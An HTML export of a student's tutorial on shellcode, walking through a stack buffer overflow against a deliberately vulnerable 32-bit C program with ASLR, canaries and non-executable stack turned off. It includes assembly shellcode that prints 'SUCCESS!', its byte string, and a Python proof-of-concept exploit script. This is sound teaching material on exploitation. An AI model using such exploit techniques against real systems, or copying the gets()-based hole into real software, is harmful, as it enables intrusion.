<!DOCTYPE html><html><head><meta charset="utf-8"><style>@font-face {
  font-family: octicons-anchor;
  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
}

* {
    box-sizing: border-box;
}

body {
    width: 980px;
    margin-right: auto;
    margin-left: auto;
}

body .markdown-body {
    padding: 45px;
    border: 1px solid #ddd;
    border-radius: 3px;
    word-wrap: break-word;
}

pre {
    font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
}

.markdown-body {
  -webkit-text-size-adjust: 100%;
  text-size-adjust: 100%;
  color: #333;
  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
  font-size: 16px;
  line-height: 1.6;
  word-wrap: break-word;
}

.markdown-body a {
  background-color: transparent;
}

.markdown-body a:active,
.markdown-body a:hover {
  outline: 0;
}

.markdown-body strong {
  font-weight: bold;
}

.markdown-body h1 {
  font-size: 2em;
  margin: 0.67em 0;
}

.markdown-body img {
  border: 0;
}

.markdown-body hr {
  box-sizing: content-box;
  height: 0;
}

.markdown-body pre {
  overflow: auto;
}

.markdown-body code,
.markdown-body kbd,
.markdown-body pre {
  font-family: monospace, monospace;
  font-size: 1em;
}

.markdown-body input {
  color: inherit;
  font: inherit;
  margin: 0;
}

.markdown-body html input[disabled] {
  cursor: default;
}

.markdown-body input {
  line-height: normal;
}

.markdown-body input[type="checkbox"] {
  box-sizing: border-box;
  padding: 0;
}

.markdown-body table {
  border-collapse: collapse;
  border-spacing: 0;
}

.markdown-body td,
.markdown-body th {
  padding: 0;
}

.markdown-body input {
  font: 13px / 1.4 Helvetica, arial, nimbussansl, liberationsans, freesans, clean, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
}

.markdown-body a {
  color: #4078c0;
  text-decoration: none;
}

.markdown-body a:hover,
.markdown-body a:active {
  text-decoration: underline;
}

.markdown-body hr {
  height: 0;
  margin: 15px 0;
  overflow: hidden;
  background: transparent;
  border: 0;
  border-bottom: 1px solid #ddd;
}

.markdown-body hr:before {
  display: table;
  content: "";
}

.markdown-body hr:after {
  display: table;
  clear: both;
  content: "";
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  margin-top: 15px;
  margin-bottom: 15px;
  line-height: 1.1;
}

.markdown-body h1 {
  font-size: 30px;
}

.markdown-body h2 {
  font-size: 21px;
}

.markdown-body h3 {
  font-size: 16px;
}

.markdown-body h4 {
  font-size: 14px;
}

.markdown-body h5 {
  font-size: 12px;
}

.markdown-body h6 {
  font-size: 11px;
}

.markdown-body blockquote {
  margin: 0;
}

.markdown-body ul,
.markdown-body ol {
  padding: 0;
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body ol ol,
.markdown-body ul ol {
  list-style-type: lower-roman;
}

.markdown-body ul ul ol,
.markdown-body ul ol ol,
.markdown-body ol ul ol,
.markdown-body ol ol ol {
  list-style-type: lower-alpha;
}

.markdown-body dd {
  margin-left: 0;
}

.markdown-body code {
  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
  font-size: 12px;
}

.markdown-body pre {
  margin-top: 0;
  margin-bottom: 0;
  font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
}

.markdown-body .select::-ms-expand {
  opacity: 0;
}

.markdown-body .octicon {
  font: normal normal normal 16px/1 octicons-anchor;
  display: inline-block;
  text-decoration: none;
  text-rendering: auto;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.markdown-body .octicon-link:before {
  content: '\f05c';
}

.markdown-body:before {
  display: table;
  content: "";
}

.markdown-body:after {
  display: table;
  clear: both;
  content: "";
}

.markdown-body>*:first-child {
  margin-top: 0 !important;
}

.markdown-body>*:last-child {
  margin-bottom: 0 !important;
}

.markdown-body a:not([href]) {
  color: inherit;
  text-decoration: none;
}

.markdown-body .anchor {
  display: inline-block;
  padding-right: 2px;
  margin-left: -18px;
}

.markdown-body .anchor:focus {
  outline: none;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  margin-top: 1em;
  margin-bottom: 16px;
  font-weight: bold;
  line-height: 1.4;
}

.markdown-body h1 .octicon-link,
.markdown-body h2 .octicon-link,
.markdown-body h3 .octicon-link,
.markdown-body h4 .octicon-link,
.markdown-body h5 .octicon-link,
.markdown-body h6 .octicon-link {
  color: #000;
  vertical-align: middle;
  visibility: hidden;
}

.markdown-body h1:hover .anchor,
.markdown-body h2:hover .anchor,
.markdown-body h3:hover .anchor,
.markdown-body h4:hover .anchor,
.markdown-body h5:hover .anchor,
.markdown-body h6:hover .anchor {
  text-decoration: none;
}

.markdown-body h1:hover .anchor .octicon-link,
.markdown-body h2:hover .anchor .octicon-link,
.markdown-body h3:hover .anchor .octicon-link,
.markdown-body h4:hover .anchor .octicon-link,
.markdown-body h5:hover .anchor .octicon-link,
.markdown-body h6:hover .anchor .octicon-link {
  visibility: visible;
}

.markdown-body h1 {
  padding-bottom: 0.3em;
  font-size: 2.25em;
  line-height: 1.2;
  border-bottom: 1px solid #eee;
}

.markdown-body h1 .anchor {
  line-height: 1;
}

.markdown-body h2 {
  padding-bottom: 0.3em;
  font-size: 1.75em;
  line-height: 1.225;
  border-bottom: 1px solid #eee;
}

.markdown-body h2 .anchor {
  line-height: 1;
}

.markdown-body h3 {
  font-size: 1.5em;
  line-height: 1.43;
}

.markdown-body h3 .anchor {
  line-height: 1.2;
}

.markdown-body h4 {
  font-size: 1.25em;
}

.markdown-body h4 .anchor {
  line-height: 1.2;
}

.markdown-body h5 {
  font-size: 1em;
}

.markdown-body h5 .anchor {
  line-height: 1.1;
}

.markdown-body h6 {
  font-size: 1em;
  color: #777;
}

.markdown-body h6 .anchor {
  line-height: 1.1;
}

.markdown-body p,
.markdown-body blockquote,
.markdown-body ul,
.markdown-body ol,
.markdown-body dl,
.markdown-body table,
.markdown-body pre {
  margin-top: 0;
  margin-bottom: 16px;
}

.markdown-body hr {
  height: 4px;
  padding: 0;
  margin: 16px 0;
  background-color: #e7e7e7;
  border: 0 none;
}

.markdown-body ul,
.markdown-body ol {
  padding-left: 2em;
}

.markdown-body ul ul,
.markdown-body ul ol,
.markdown-body ol ol,
.markdown-body ol ul {
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body li>p {
  margin-top: 16px;
}

.markdown-body dl {
  padding: 0;
}

.markdown-body dl dt {
  padding: 0;
  margin-top: 16px;
  font-size: 1em;
  font-style: italic;
  font-weight: bold;
}

.markdown-body dl dd {
  padding: 0 16px;
  margin-bottom: 16px;
}

.markdown-body blockquote {
  padding: 0 15px;
  color: #777;
  border-left: 4px solid #ddd;
}

.markdown-body blockquote>:first-child {
  margin-top: 0;
}

.markdown-body blockquote>:last-child {
  margin-bottom: 0;
}

.markdown-body table {
  display: block;
  width: 100%;
  overflow: auto;
  word-break: normal;
  word-break: keep-all;
}

.markdown-body table th {
  font-weight: bold;
}

.markdown-body table th,
.markdown-body table td {
  padding: 6px 13px;
  border: 1px solid #ddd;
}

.markdown-body table tr {
  background-color: #fff;
  border-top: 1px solid #ccc;
}

.markdown-body table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

.markdown-body img {
  max-width: 100%;
  box-sizing: content-box;
  background-color: #fff;
}

.markdown-body code {
  padding: 0;
  padding-top: 0.2em;
  padding-bottom: 0.2em;
  margin: 0;
  font-size: 85%;
  background-color: rgba(0,0,0,0.04);
  border-radius: 3px;
}

.markdown-body code:before,
.markdown-body code:after {
  letter-spacing: -0.2em;
  content: "\00a0";
}

.markdown-body pre>code {
  padding: 0;
  margin: 0;
  font-size: 100%;
  word-break: normal;
  white-space: pre;
  background: transparent;
  border: 0;
}

.markdown-body .highlight {
  margin-bottom: 16px;
}

.markdown-body .highlight pre,
.markdown-body pre {
  padding: 16px;
  overflow: auto;
  font-size: 85%;
  line-height: 1.45;
  background-color: #f7f7f7;
  border-radius: 3px;
}

.markdown-body .highlight pre {
  margin-bottom: 0;
  word-break: normal;
}

.markdown-body pre {
  word-wrap: normal;
}

.markdown-body pre code {
  display: inline;
  max-width: initial;
  padding: 0;
  margin: 0;
  overflow: initial;
  line-height: inherit;
  word-wrap: normal;
  background-color: transparent;
  border: 0;
}

.markdown-body pre code:before,
.markdown-body pre code:after {
  content: normal;
}

.markdown-body kbd {
  display: inline-block;
  padding: 3px 5px;
  font-size: 11px;
  line-height: 10px;
  color: #555;
  vertical-align: middle;
  background-color: #fcfcfc;
  border: solid 1px #ccc;
  border-bottom-color: #bbb;
  border-radius: 3px;
  box-shadow: inset 0 -1px 0 #bbb;
}

.markdown-body .pl-c {
  color: #969896;
}

.markdown-body .pl-c1,
.markdown-body .pl-s .pl-v {
  color: #0086b3;
}

.markdown-body .pl-e,
.markdown-body .pl-en {
  color: #795da3;
}

.markdown-body .pl-s .pl-s1,
.markdown-body .pl-smi {
  color: #333;
}

.markdown-body .pl-ent {
  color: #63a35c;
}

.markdown-body .pl-k {
  color: #a71d5d;
}

.markdown-body .pl-pds,
.markdown-body .pl-s,
.markdown-body .pl-s .pl-pse .pl-s1,
.markdown-body .pl-sr,
.markdown-body .pl-sr .pl-cce,
.markdown-body .pl-sr .pl-sra,
.markdown-body .pl-sr .pl-sre {
  color: #183691;
}

.markdown-body .pl-v {
  color: #ed6a43;
}

.markdown-body .pl-id {
  color: #b52a1d;
}

.markdown-body .pl-ii {
  background-color: #b52a1d;
  color: #f8f8f8;
}

.markdown-body .pl-sr .pl-cce {
  color: #63a35c;
  font-weight: bold;
}

.markdown-body .pl-ml {
  color: #693a17;
}

.markdown-body .pl-mh,
.markdown-body .pl-mh .pl-en,
.markdown-body .pl-ms {
  color: #1d3e81;
  font-weight: bold;
}

.markdown-body .pl-mq {
  color: #008080;
}

.markdown-body .pl-mi {
  color: #333;
  font-style: italic;
}

.markdown-body .pl-mb {
  color: #333;
  font-weight: bold;
}

.markdown-body .pl-md {
  background-color: #ffecec;
  color: #bd2c00;
}

.markdown-body .pl-mi1 {
  background-color: #eaffea;
  color: #55a532;
}

.markdown-body .pl-mdr {
  color: #795da3;
  font-weight: bold;
}

.markdown-body .pl-mo {
  color: #1d3e81;
}

.markdown-body kbd {
  display: inline-block;
  padding: 3px 5px;
  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
  line-height: 10px;
  color: #555;
  vertical-align: middle;
  background-color: #fcfcfc;
  border: solid 1px #ccc;
  border-bottom-color: #bbb;
  border-radius: 3px;
  box-shadow: inset 0 -1px 0 #bbb;
}

.markdown-body .plan-price-unit {
  color: #767676;
  font-weight: normal;
}

.markdown-body .task-list-item {
  list-style-type: none;
}

.markdown-body .task-list-item+.task-list-item {
  margin-top: 3px;
}

.markdown-body .task-list-item input {
  margin: 0 0.35em 0.25em -1.6em;
  vertical-align: middle;
}

.markdown-body .plan-choice {
  padding: 15px;
  padding-left: 40px;
  display: block;
  border: 1px solid #e0e0e0;
  position: relative;
  font-weight: normal;
  background-color: #fafafa;
}

.markdown-body .plan-choice.open {
  background-color: #fff;
}

.markdown-body .plan-choice.open .plan-choice-seat-breakdown {
  display: block;
}

.markdown-body .plan-choice-free {
  border-radius: 3px 3px 0 0;
}

.markdown-body .plan-choice-paid {
  border-radius: 0 0 3px 3px;
  border-top: 0;
  margin-bottom: 20px;
}

.markdown-body .plan-choice-radio {
  position: absolute;
  left: 15px;
  top: 18px;
}

.markdown-body .plan-choice-exp {
  color: #999;
  font-size: 12px;
  margin-top: 5px;
}

.markdown-body .plan-choice-seat-breakdown {
  margin-top: 10px;
  display: none;
}

.markdown-body :checked+.radio-label {
  z-index: 1;
  position: relative;
  border-color: #4078c0;
}
</style><title>shellcoding</title></head><body><article class="markdown-body"><h1>
<a id="user-content-shellcode" class="anchor" href="#shellcode" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Shellcode</h1>
<h2>
<a id="user-content-what-is-it" class="anchor" href="#what-is-it" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>What is it?</h2>
<p>Shellcode is a small piece of code written by an attacker of a software system. This code is run when an attacker is able to successfully exploit a vulnerability in an application. For the purposes of this article, we will exploit this simple program:</p>
<h2>
<a id="user-content-the-target" class="anchor" href="#the-target" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>The target</h2>
<p><strong>vuln.c</strong></p>
<div class="highlight highlight-source-c"><pre>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span>
#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>unistd.h<span class="pl-pds">&gt;</span></span>
#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span>
#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>string.h<span class="pl-pds">&gt;</span></span>

<span class="pl-k">void</span> <span class="pl-en">getinput</span>()
{
  <span class="pl-k">char</span> buffer[<span class="pl-c1">64</span>];
  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-c1">%p</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, buffer); <span class="pl-c"><span class="pl-c">//</span> print address of the beginning of buffer</span>

  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>&gt; <span class="pl-pds">"</span></span>); 
  <span class="pl-c1">fflush</span>(stdout);

  <span class="pl-c1">gets</span>(buffer); <span class="pl-c"><span class="pl-c">//</span> overflow happens here</span>

  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\n</span>got input: <span class="pl-c1">%s</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, buffer);
}

<span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span> **argv)
{
  <span class="pl-c1">getinput</span>();
}</pre></div>
<p>This simple program takes input from the user and prints it back. To get input from the user, the program uses the <code>gets()</code> function. This function is dangerous since it does not check for buffer overflow. For simplicity, we will compile this program for 32-bit linux, turn off <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" rel="nofollow">Address Space Layout Randomization (ASLR)</a>, turn off <a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries" rel="nofollow">Stack Canaries</a>, and allow the stack to be executable.</p>
<p>Turn off ASLR:</p>
<p><code>sudo sh -c "echo 0 &gt;&gt; /proc/sys/kernel/randomize_va_space"</code></p>
<p><strong>Makefile</strong></p>
<div class="highlight highlight-source-makefile"><pre><span class="pl-smi">CC</span>=gcc

<span class="pl-en">all</span>: vuln

<span class="pl-en">vuln</span>: vuln.c
  $(CC) -o vuln -m32 -Wno-deprecated-declarations -Wno-overflow -fno-stack-protector vuln.c -z execstack

<span class="pl-en">clean</span>:
  rm vuln</pre></div>
<p><strong>Example run:</strong></p>
<p><a href="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/normal_run.png" target="_blank"><img src="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/normal_run.png" alt="example run of vuln" style="max-width:100%;"></a></p>
<h2>
<a id="user-content-exploitation" class="anchor" href="#exploitation" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Exploitation</h2>
<p>We can see that this program is indeed vulnerable to a buffer overflow by providing it more input than it has to store:</p>
<p><a href="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/overflowed.png" target="_blank"><img src="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/overflowed.png" alt="example run of vuln with overflow" style="max-width:100%;"></a></p>
<p>To exploit the buffer overflow in this program, we will place shellcode on the stack and overflow the return address to point to the beginning of our code on the stack:</p>
<p><a href="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/stack1.png" target="_blank"><img src="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/stack1.png" alt="stack_diagram" style="max-width:100%;"></a></p>
<p>To test our current understanding of the stack, we can try and overflow the target program, overwriting the return address and cause a segmentation fault:</p>
<p><a href="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/no_segfault.png" target="_blank"><img src="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/no_segfault.png" alt="no segfault" style="max-width:100%;"></a></p>
<p>There was no segmentation fault? Maybe our current understanding of the stack is flawed. Let's disassemble the program to see what's up.</p>
<p><code>objdump -d vuln</code></p>
<p><a href="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/get_input_disassembled.png" target="_blank"><img src="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/get_input_disassembled.png" alt="preable and call of first function within getinput()" style="max-width:100%;"></a></p>
<p>From the preamble of this function call, we can see that the program allocates 0x48 bytes of storage on the stack. This does not make much since since our function only requires 0x40 (64) bytes to store the contents of <code>buffer[64]</code>. So why is this? <a href="https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack" rel="nofollow">With some research</a>, it appears that this is because the x86 architecture has some instructions that can run in parallel, but only when the stack pointer is aligned on a 16-byte boundary. In order to align <code>$esp</code> to the boundary, the compiler needs to create an 8 byte gap at the end of the stack frame. This should not change our plan of attack, we just need to overflow the buffer by 8 more bytes to overcome this gap.</p>
<p><a href="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/stack2.png" target="_blank"><img src="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/stack2.png" alt="modified stack diagram" style="max-width:100%;"></a></p>
<p>Now that we have a new understanding of the stack, we can try again to exploit it:</p>
<p><a href="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/overflowed_return_address.png" target="_blank"><img src="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/overflowed_return_address.png" alt="return address overflowed" style="max-width:100%;"></a></p>
<p>We have successfully overwritten the return address of the function! Now we need to write some shellcode and change the return address of the program to point to it.</p>
<h2>
<a id="user-content-writing-shellcode" class="anchor" href="#writing-shellcode" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Writing Shellcode</h2>
<p>Actually writing shellcode is quite easy. You can do this by writing some assembly and assembling it. Then you can extract the binary from the object file. My framework for shellcode development can be found <a href="https://github.com/gilderjw/shellcode">here</a>. Another good resource is <a href="http://shell-storm.org/shellcode/" rel="nofollow">shell-storm.org</a>. This website has a bunch of different examples of shellcode for different architectures. One thing to keep in mind when writing shellcode is that you cannot have any null bytes if the overflow is due to a call to <code>gets()</code>. To overcome this restriction, an attacker has to get a little creative to accomplish their goal.</p>
<p><strong>My shellcode:</strong></p>
<div class="highlight highlight-source-assembly"><pre><span class="pl-en">.</span><span class="pl-c1">section</span><span class="pl-en"> .text</span>
<span class="pl-en">.intel_syntax noprefix</span>
<span class="pl-en">.</span><span class="pl-c1">global</span> <span class="pl-en">main</span>

<span class="pl-en">main:</span>
<span class="pl-en">    </span><span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">0x08080808</span><span class="pl-en">         # </span><span class="pl-k">not</span><span class="pl-en"> length of string yet</span><span class="pl-s1">,</span><span class="pl-en"> need to shift</span>
<span class="pl-en">    </span><span class="pl-k">shr</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">24</span><span class="pl-en">                 # </span><span class="pl-v">edx</span><span class="pl-en"> = </span><span class="pl-c1">8</span>
<span class="pl-en">    </span>
<span class="pl-en">    </span><span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x21535345</span><span class="pl-en">             # ESS!</span>
<span class="pl-en">    </span><span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x43435553</span><span class="pl-en">             # SUCC</span>
<span class="pl-en">    </span><span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">esp</span>
<span class="pl-en">    </span>
<span class="pl-en">    </span><span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">0x01010101</span><span class="pl-en">         # use stdio as file descriptor</span>
<span class="pl-en">    </span><span class="pl-k">shr</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">24</span><span class="pl-en">                 # </span><span class="pl-v">ebx</span><span class="pl-en"> = </span><span class="pl-c1">1</span>

<span class="pl-en">    </span><span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">0x04040404</span><span class="pl-en">         # fwrite system </span><span class="pl-k">call</span>
<span class="pl-en">    </span><span class="pl-k">shr</span><span class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">24</span><span class="pl-en">                 # </span><span class="pl-v">eax</span><span class="pl-en"> = </span><span class="pl-c1">4</span>

<span class="pl-en">    </span><span class="pl-k">int</span><span class="pl-en"> </span><span class="pl-c1">0x80</span><span class="pl-en">                    # </span><span class="pl-k">syscall</span>

<span class="pl-en">    </span><span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">0x01010101</span><span class="pl-en">         # exit system </span><span class="pl-k">call</span>
<span class="pl-en">    </span><span class="pl-k">shr</span><span class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">24</span><span class="pl-en">                 # </span><span class="pl-v">eax</span><span class="pl-en"> = </span><span class="pl-c1">3</span>

<span class="pl-en">    </span><span class="pl-k">int</span><span class="pl-en"> </span><span class="pl-c1">0x80</span><span class="pl-en">                    # </span><span class="pl-k">syscall</span></pre></div>
<p>This assembly code will set up the registers and evoke the write system call to print the string 'SUCCESS!' to standard output. When I create shellcode out of this with my framework, I get the string: <code>'\xba\x08\x08\x08\x08\xc1\xea\x18\x68\x45\x53\x53\x21\x68\x53\x55\x43\x43\x89\xe1\xbb\x01\x01\x01\x01\xc1\xeb\x18\xb8\x04\x04\x04\x04\xc1\xe8\x18\xcd\x80\xb8\x01\x01\x01\x01\xc1\xe8\x18\xcd\x80'</code></p>
<h2>
<a id="user-content-putting-it-all-together" class="anchor" href="#putting-it-all-together" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Putting it all together</h2>
<p>Now that we know how to modify the target program's control logic and we have code that we wish to run, we can now create our proof of concept exploit.</p>
<p><strong>exploit.py</strong></p>
<div class="highlight highlight-source-python"><pre><span class="pl-c"><span class="pl-c">#</span>!/usr/bin/python </span>

<span class="pl-k">import</span> sys
<span class="pl-k">import</span> struct

<span class="pl-c1">BUFFER_SIZE</span> <span class="pl-k">=</span> <span class="pl-c1">64</span>
<span class="pl-c1">EXTRA_PADDING</span> <span class="pl-k">=</span> <span class="pl-c1">8</span>

<span class="pl-c"><span class="pl-c">#</span> prints SUCCESS!</span>
<span class="pl-c1">SHELLCODE</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\xba\x08\x08\x08\x08\xc1\xea\x18\x68\x45\x53\x53\x21\x68\x53\x55\x43\x43\x89\xe1\xbb\x01\x01\x01\x01\xc1\xeb\x18\xb8\x04\x04\x04\x04\xc1\xe8\x18\xcd\x80\xb8\x01\x01\x01\x01\xc1\xe8\x18\xcd\x80</span><span class="pl-pds">'</span></span>

<span class="pl-c1">NOP_SIZE</span> <span class="pl-k">=</span> <span class="pl-c1">BUFFER_SIZE</span> <span class="pl-k">-</span> <span class="pl-c1">len</span>(<span class="pl-c1">SHELLCODE</span>) <span class="pl-k">+</span> <span class="pl-c1">EXTRA_PADDING</span>

<span class="pl-k">def</span> <span class="pl-en">main</span>(<span class="pl-smi">buffer_address</span>):

  <span class="pl-c"><span class="pl-c">#</span> the memory right after the current stack frame is not used, we can use this for stack variables in the shellcode</span>
  new_ebp <span class="pl-k">=</span> struct.pack(<span class="pl-s"><span class="pl-pds">'</span>&lt;I<span class="pl-pds">'</span></span>, buffer_address)

  <span class="pl-c"><span class="pl-c">#</span> our shellcode is at the beginning of the buffer</span>
  new_eip <span class="pl-k">=</span> struct.pack(<span class="pl-s"><span class="pl-pds">'</span>&lt;I<span class="pl-pds">'</span></span>, buffer_address)

  <span class="pl-c"><span class="pl-c">#</span> build the string</span>
  exploit <span class="pl-k">=</span> <span class="pl-c1">SHELLCODE</span> <span class="pl-k">+</span>\
            <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\x90</span><span class="pl-pds">'</span></span> <span class="pl-k">*</span> <span class="pl-c1">NOP_SIZE</span> <span class="pl-k">+</span> \
            new_ebp <span class="pl-k">+</span>\
            new_eip

  <span class="pl-c1">print</span>(exploit)

<span class="pl-k">if</span> <span class="pl-c1">__name__</span> <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">'</span>__main__<span class="pl-pds">'</span></span>:
  main(<span class="pl-c1">int</span>(sys.argv[<span class="pl-c1">1</span>], <span class="pl-c1">16</span>))
</pre></div>
<p>This program will take in the address of <code>buffer[64]</code> and creates the exploit string that runs our shellcode. The exploit string is made from our shellcode, a string of NOPs (\x90) for padding, the address that we will begin our new stack, and the address to the beginning of our shellcode.</p>
